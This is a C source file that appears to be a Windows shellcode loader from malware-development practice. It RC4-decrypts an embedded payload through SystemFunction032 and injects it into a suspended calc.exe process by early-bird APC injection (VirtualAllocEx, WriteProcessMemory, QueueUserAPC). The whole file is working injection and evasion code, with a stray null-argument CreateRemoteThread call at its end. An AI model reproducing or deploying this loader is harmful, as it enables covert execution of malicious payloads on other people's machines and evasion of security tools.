# include <Windows.h>
# include "sysfn032.h"
# include "sc.h"


BOOL CreateSuspendedProcess(IN LPCSTR lpProcessPath, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(STARTUPINFOA);

    if (!CreateProcessA(NULL, (LPSTR)lpProcessPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        //printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    *dwProcessId = pi.dwProcessId;
    *hProcess = pi.hProcess;
    *hThread = pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
        return TRUE;
    }

    return FALSE;
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;
    DWORD dwOldProtection = NULL;

    pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        //printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, NULL)) {
        //printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        //printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    
   // HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, NULL);
    if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
        //printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}



void sysfn032() {
    BYTE key[] = "maldev123";
    const unsigned char plaintext[] = "Vuongle.Vigo";
    //encryption
    if (Rc4EncryptionViaSystemFunc032((PBYTE)key, (PBYTE)sc, sizeof(key), sizeof(sc))) {
        //printf("Encoded text: %s\n", plaintext);
    }
}

int main() {
    PVOID x = &sc;
    build_sc();
    //Sleep(5000);
    sysfn032();
    DWORD dwProcessId;
    HANDLE hProcess, hThread;
    
    if (!CreateSuspendedProcess("C:\\Windows\\System32\\calc.exe", &dwProcessId, &hProcess, &hThread)) {
        //printf("[!] CreateSuspendedProcess Failed\n");
        return -1;
    }

    if (!RunViaApcInjection(hThread, hProcess, sc, sizeof(sc))) {
        //printf("[!] RunViaApcInjection Failed\n");
        return -1;
    }

   ResumeThread(hThread);
   
   //CloseHandle(hProcess);

   CreateRemoteThread(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}